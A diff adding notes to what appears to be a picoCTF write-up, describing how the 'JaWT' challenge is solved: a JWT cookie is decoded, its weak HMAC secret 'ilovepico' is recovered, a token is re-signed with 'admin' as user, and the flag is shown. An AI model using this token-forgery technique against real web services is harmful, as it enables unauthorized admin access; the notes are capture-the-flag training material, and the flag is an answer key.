@@ -153,4 +153,26 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.AMuH3A1TJcRUktdMkvEvVs
 Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
 - picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
 
-23. 
+-------------------------------------
+first cookie:
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y
+
+Header: 
+{
+  : "JWT",
+  : "HS256"
+}
+Payload:
+{
+  "user": "john"
+}
+Secret/Signature: 
+ilovepico
+
+
+
+add "admin" as user payload value together with "ilovepico" and convert to jwt token:
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
+
+send with GET in burp:
+picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
